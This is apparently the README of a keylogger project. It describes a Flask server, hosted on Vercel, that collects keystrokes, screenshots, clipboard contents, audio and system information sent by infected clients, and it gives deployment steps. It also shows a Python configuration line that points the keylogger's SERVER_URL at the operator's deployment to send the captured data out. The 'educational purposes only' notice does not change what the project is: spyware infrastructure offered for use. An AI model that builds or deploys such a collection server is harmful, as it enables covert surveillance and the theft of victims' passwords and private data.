# Keylogger Server

A simple web server to receive and display keylogger data. This server provides a minimal UI to view captured keystrokes, screenshots, and other information from connected keyloggers.

## Features

- Receive keylogger data via a REST API
- Organize data by client ID
- View captured keystrokes, screenshots, and system information
- Simple, responsive web interface

## Deployment to Vercel

This server is designed to be deployed to Vercel for easy hosting. Follow these steps:

1. Install the Vercel CLI:
   ```
   npm install -g vercel
   ```

2. Login to Vercel:
   ```
   vercel login
   ```

3. Deploy the application:
   ```
   vercel
   ```

4. Follow the prompts to complete the deployment.

## Local Development

To run the server locally:

1. Install dependencies:
   ```
   pip install -r requirements.txt
   ```

2. Run the Flask server:
   ```
   python app.py
   ```

3. The server will be available at http://localhost:5000

## API Endpoints

### POST /api/data
Submit data from the keylogger.

**Parameters:**
- `client_id` (optional): Unique identifier for the client. If not provided, a UUID will be generated.
- `type`: Type of data being sent (keylog, screenshot, clipboard, audio, system)
- `content`: The content of the captured data
- `system_info`: System information of the client

**Files:**
You can attach files such as screenshots or audio recordings.

## Keylogger Configuration

In the `keylogger_web.py` file, update the `SERVER_URL` variable with your Vercel deployment URL:

```python
SERVER_URL = "https://your-app-name.vercel.app/api/data"
```

## Security Notice

This project is intended for educational purposes only. Unauthorized use of keyloggers or any monitoring software without explicit consent may violate privacy laws and regulations.

## License

This project is provided for educational purposes only. Use responsibly and ethically.
